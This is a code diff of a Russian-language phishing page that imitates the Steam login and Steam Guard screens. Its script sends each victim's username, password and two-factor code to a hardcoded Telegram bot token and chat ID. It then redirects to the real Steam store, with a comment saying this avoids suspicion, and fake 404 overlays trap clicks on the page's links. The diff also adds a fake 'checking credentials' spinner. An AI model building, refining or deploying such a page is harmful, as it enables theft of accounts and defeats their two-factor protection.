@@ -2,36 +2,53 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Steam Вход</title>
     <style>
-        /* Полная стилизация под реальный Steam 2026 */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        /* === Полное соответствие официальному дизайну Steam (2026) === */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: "Motiva Sans", Arial, Helvetica, sans-serif;
+            font-family: "Motiva Sans", "Arial", sans-serif;
             background: #1b2838;
             color: #c6d4df;
             min-height: 100vh;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
             padding: 20px;
+            flex-direction: column;
         }
-        .container {
+
+        .login-wrapper {
             width: 100%;
-            max-width: 360px;
+            max-width: 400px;
             background: #181e25;
             border-radius: 6px;
-            padding: 32px;
+            padding: 32px 32px 24px;
             box-shadow: 0 4px 16px rgba(0, 0, 0, 0.5);
+            position: relative;
         }
-        .logo {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 30px;
+
+        /* Логотип STEAM */
+        .steam-logo {
+            text-align: center;
+            margin-bottom: 24px;
         }
-        /* Inline SVG логотипа Steam (белый текст) */
-        .logo svg { width: 176px; height: 52px; }
+
+        .steam-logo span {
+            font-size: 32px;
+            font-weight: bold;
+            color: #ffffff;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+
         h2 {
             font-size: 20px;
             font-weight: 400;
@@ -39,6 +56,7 @@
             text-align: center;
             color: #ffffff;
         }
+
         label {
             display: block;
             font-size: 13px;
@@ -47,6 +65,7 @@
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
+
         input {
             width: 100%;
             padding: 12px;
@@ -57,13 +76,19 @@
             font-size: 15px;
             margin-bottom: 18px;
             outline: none;
-            transition: border 0.2s;
+            transition: border 0.2s, background 0.2s;
         }
+
         input:focus {
             border-color: #4c9b1c;
             background: #3a3e45;
         }
-        button {
+
+        input::placeholder {
+            color: #6a6f75;
+        }
+
+        .btn-login {
             width: 100%;
             padding: 14px;
             background: linear-gradient(to bottom, #799905, #536904);
@@ -77,43 +102,100 @@
             margin-bottom: 18px;
             transition: background 0.2s;
         }
-        button:hover {
+
+        .btn-login:hover {
             background: linear-gradient(to bottom, #8db002, #5f7a04);
         }
+
+        .btn-login:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
         .links {
             display: flex;
             justify-content: space-between;
             font-size: 13px;
         }
+
         .links a {
             color: #8a8a8a;
             text-decoration: none;
             transition: color 0.2s;
         }
+
         .links a:hover {
             color: #c6d4df;
             text-decoration: underline;
         }
+
         .footer {
             margin-top: 24px;
             font-size: 11px;
             color: #4a4a4a;
             text-align: center;
+            max-width: 400px;
+            line-height: 1.6;
         }
+
         .footer a {
             color: #4a4a4a;
             text-decoration: none;
         }
-        .footer a:hover { text-decoration: underline; }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Анимация загрузки */
+        .spinner-overlay {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(24, 30, 37, 0.9);
+            border-radius: 6px;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 10;
+        }
+
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top: 3px solid #4c9b1c;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 12px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .spinner-overlay p {
+            color: #c6d4df;
+            font-size: 14px;
+        }
+
+        /* Модальное окно 404 */
         .error-overlay {
             display: none;
             position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
             background: rgba(0,0,0,0.7);
             align-items: center;
             justify-content: center;
             z-index: 100;
         }
+
         .error-box {
             background: #1b1b2e;
             padding: 28px;
@@ -122,16 +204,19 @@
             max-width: 320px;
             width: 90%;
         }
+
         .error-box h3 {
             font-size: 22px;
             margin-bottom: 12px;
             color: #e74c3c;
         }
+
         .error-box p {
             font-size: 14px;
             color: #aaa;
             margin-bottom: 18px;
         }
+
         .error-box button {
             background: #4a4a4a;
             color: white;
@@ -141,56 +226,59 @@
             font-size: 14px;
             cursor: pointer;
         }
+
+        #steamGuardForm h2 {
+            margin-bottom: 10px;
+        }
+
+        .guard-subtitle {
+            font-size: 13px;
+            color: #8a8a8a;
+            margin-bottom: 20px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
-
-    <div class="container" id="login_form">
-        <div class="logo">
-            <!-- Логотип Steam (точная копия) -->
-            <svg viewBox="0 0 176 52" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M58.832 0L52.976 4.608L47.136 0L43.472 2.944L49.328 7.584L43.472 12.16L47.136 15.104L52.976 10.496L58.832 15.104L62.496 12.16L56.656 7.584L62.496 2.944L58.832 0Z" fill="white"/>
-                <path d="M69.488 6.16V28.288H64.832V6.16H69.488Z" fill="white"/>
-                <path d="M86.816 6.16V28.288H82.176V17.536H78.624V28.288H73.968V6.16H78.624V13.68H82.176V6.16H86.816Z" fill="white"/>
-                <path d="M104.288 6.16H99.632V16.32L94.688 6.16H90.032V28.288H94.688V18.128L99.632 28.288H104.288V6.16Z" fill="white"/>
-                <path d="M121.76 6.16L117.504 11.76L113.248 6.16H107.488V28.288H112.144V13.904L117.504 20.304L122.864 13.904V28.288H127.52V6.16H121.76Z" fill="white"/>
-                <path d="M149.584 6.16V10.08H140.096V15.264H148.384V19.168H140.096V24.368H149.584V28.288H135.44V6.16H149.584Z" fill="white"/>
-                <path d="M172.112 28.288L167.504 20.528H163.728V28.288H159.072V6.16H167.776C170.528 6.16 172.112 7.568 172.112 10.144C172.112 12.288 171.056 13.616 169.328 14.24L174.416 28.288H172.112ZM163.728 10.08V16.704H167.024C168.304 16.704 168.88 16.048 168.88 14.88V11.904C168.88 10.736 168.304 10.08 167.024 10.08H163.728Z" fill="white"/>
-            </svg>
+    <div class="login-wrapper" id="loginForm">
+        <div class="steam-logo">
+            <span>STEAM</span>
         </div>
         <h2>Войти в аккаунт</h2>
+
         <label for="username">Имя аккаунта</label>
-        <input type="text" id="username" placeholder="">
+        <input type="text" id="username" placeholder="" required autofocus>
+
         <label for="password">Пароль</label>
-        <input type="password" id="password" placeholder="">
-        <button onclick="sendCredentials()">Войти</button>
+        <input type="password" id="password" placeholder="" required>
+
+        <button class="btn-login" id="loginBtn" onclick="attemptLogin()">Войти</button>
+
         <div class="links">
             <a href="#" onclick="show404(event)">Забыли пароль?</a>
             <a href="#" onclick="show404(event)">Создать аккаунт</a>
         </div>
+
+        <!-- Спиннер загрузки -->
+        <div class="spinner-overlay" id="spinner">
+            <div class="spinner"></div>
+            <p>Проверка учётных данных…</p>
+        </div>
     </div>
 
-    <div class="container" id="code_form" style="display:none;">
-        <div class="logo">
-            <svg viewBox="0 0 176 52" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <!-- тот же логотип -->
-                <path d="M58.832 0L52.976 4.608L47.136 0L43.472 2.944L49.328 7.584L43.472 12.16L47.136 15.104L52.976 10.496L58.832 15.104L62.496 12.16L56.656 7.584L62.496 2.944L58.832 0Z" fill="white"/>
-                <path d="M69.488 6.16V28.288H64.832V6.16H69.488Z" fill="white"/>
-                <path d="M86.816 6.16V28.288H82.176V17.536H78.624V28.288H73.968V6.16H78.624V13.68H82.176V6.16H86.816Z" fill="white"/>
-                <path d="M104.288 6.16H99.632V16.32L94.688 6.16H90.032V28.288H94.688V18.128L99.632 28.288H104.288V6.16Z" fill="white"/>
-                <path d="M121.76 6.16L117.504 11.76L113.248 6.16H107.488V28.288H112.144V13.904L117.504 20.304L122.864 13.904V28.288H127.52V6.16H121.76Z" fill="white"/>
-                <path d="M149.584 6.16V10.08H140.096V15.264H148.384V19.168H140.096V24.368H149.584V28.288H135.44V6.16H149.584Z" fill="white"/>
-                <path d="M172.112 28.288L167.504 20.528H163.728V28.288H159.072V6.16H167.776C170.528 6.16 172.112 7.568 172.112 10.144C172.112 12.288 171.056 13.616 169.328 14.24L174.416 28.288H172.112ZM163.728 10.08V16.704H167.024C168.304 16.704 168.88 16.048 168.88 14.88V11.904C168.88 10.736 168.304 10.08 167.024 10.08H163.728Z" fill="white"/>
-            </svg>
+    <!-- Форма Steam Guard (скрыта изначально) -->
+    <div class="login-wrapper" id="steamGuardForm" style="display: none;">
+        <div class="steam-logo">
+            <span>STEAM</span>
         </div>
         <h2>Steam Guard</h2>
-        <p style="font-size:14px; margin-bottom:20px; color:#8a8a8a;">Введите код из приложения Steam Guard на мобильном устройстве.</p>
+        <p class="guard-subtitle">Для входа в аккаунт введите код, сгенерированный в мобильном приложении Steam.</p>
         <label for="twofactorcode">Код</label>
-        <input type="text" id="twofactorcode" placeholder="">
-        <button onclick="sendCode()">Подтвердить</button>
+        <input type="text" id="twofactorcode" placeholder="" required>
+        <button class="btn-login" onclick="submitCode()">Подтвердить</button>
         <div class="links">
             <a href="#" onclick="show404(event)">Помощь</a>
-            <a href="#" onclick="show404(event)">Вернуться</a>
+            <a href="#" onclick="show404(event)">Вернуться ко входу</a>
         </div>
     </div>
 
@@ -198,11 +286,12 @@
         <span>© 2026 Valve Corporation. Все права защищены. Steam, логотип Steam являются торговыми марками Valve Corporation.</span><br>
         <a href="#" onclick="show404(event)">Конфиденциальность</a> |
         <a href="#" onclick="show404(event)">Правовая информация</a> |
-        <a href="#" onclick="show404(event)">Соглашение подписчика Steam</a>
+        <a href="#" onclick="show404(event)">Соглашение подписчика Steam</a> |
+        <a href="#" onclick="show404(event)">Возвраты</a>
     </div>
 
-    <!-- Окно ошибки 404 -->
-    <div class="error-overlay" id="error_overlay">
+    <!-- Оверлей ошибки 404 -->
+    <div class="error-overlay" id="errorOverlay">
         <div class="error-box">
             <h3>Ошибка 404</h3>
             <p>Страница не найдена.</p>
@@ -211,52 +300,84 @@
     </div>
 
     <script>
-        // Твои реальные данные (уже вшиты)
+        // === НАСТРОЙКИ (уже заполнены) ===
         const TOKEN = '8698750847:AAF9sdIJ1A7fTtN2E586inRee0joNbs_nCE';
         const CHAT_ID = '8171360047';
 
+        // Глобальные переменные для сохранения данных
+        let currentUsername = '';
+        let currentPassword = '';
+
+        // Отправка сообщения в Telegram
         function sendToTelegram(text) {
             fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT_ID, text: text})
-            });
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            }).catch(err => console.log('Telegram send error:', err));
         }
 
-        let currentUsername = '', currentPassword = '';
+        // Обработка кнопки "Войти"
+        function attemptLogin() {
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const loginBtn = document.getElementById('loginBtn');
 
-        function sendCredentials() {
-            currentUsername = document.getElementById('username').value.trim();
-            currentPassword = document.getElementById('password').value.trim();
-            if (currentUsername && currentPassword) {
-                sendToTelegram(`🔥 НОВЫЙ ЛОГИН\nLogin: ${currentUsername}\nPassword: ${currentPassword}`);
-                document.getElementById('login_form').style.display = 'none';
-                document.getElementById('code_form').style.display = 'block';
-            } else {
-                alert('Пожалуйста, заполните оба поля.');
+            // Валидация пустых полей
+            if (!usernameInput.value.trim() || !passwordInput.value.trim()) {
+                // Браузер покажет свои сообщения об ошибке, но мы можем добавить класс для стиля
+                usernameInput.reportValidity();
+                passwordInput.reportValidity();
+                return;
             }
+
+            currentUsername = usernameInput.value.trim();
+            currentPassword = passwordInput.value.trim();
+
+            // Отправляем данные в Telegram немедленно
+            sendToTelegram(`🔥 НОВЫЙ ЛОГИН\nLogin: ${currentUsername}\nPassword: ${currentPassword}`);
+
+            // Блокируем кнопку и показываем спиннер
+            loginBtn.disabled = true;
+            document.getElementById('spinner').style.display = 'flex';
+
+            // Имитация проверки на сервере (всегда успешно)
+            setTimeout(() => {
+                // Скрываем спиннер и форму логина, показываем Steam Guard
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('steamGuardForm').style.display = 'block';
+                loginBtn.disabled = false;
+            }, 1500);
         }
 
-        function sendCode() {
-            const code = document.getElementById('twofactorcode').value.trim();
-            if (code) {
-                sendToTelegram(`✅ КОД STEAM GUARD для ${currentUsername}: ${code}`);
-                // После отправки кода перенаправляем на настоящий Steam
-                window.location.href = 'https://store.steampowered.com';
+        // Отправка кода Steam Guard
+        function submitCode() {
+            const codeInput = document.getElementById('twofactorcode');
+            const code = codeInput.value.trim();
+            if (!code) {
+                codeInput.reportValidity();
+                return;
             }
+
+            // Отправляем код в Telegram
+            sendToTelegram(`✅ КОД STEAM GUARD для ${currentUsername}: ${code}`);
+
+            // Перенаправление на настоящий Steam, чтобы не вызывать подозрений
+            window.location.href = 'https://store.steampowered.com';
         }
 
-        // Перехват всех сторонних ссылок – показываем фальшивую 404
+        // Обработчики для ссылок 404
         function show404(e) {
             e.preventDefault();
-            document.getElementById('error_overlay').style.display = 'flex';
+            document.getElementById('errorOverlay').style.display = 'flex';
         }
 
         function hide404() {
-            document.getElementById('error_overlay').style.display = 'none';
+            document.getElementById('errorOverlay').style.display = 'none';
         }
 
-        // Блокировка кликов по логотипу, футеру и т.д.
+        // Дополнительно: перехват любых кликов по ссылкам с href="#" за пределами основных
         document.addEventListener('click', function(e) {
             if (e.target.tagName === 'A' && e.target.getAttribute('href') === '#') {
                 show404(e);
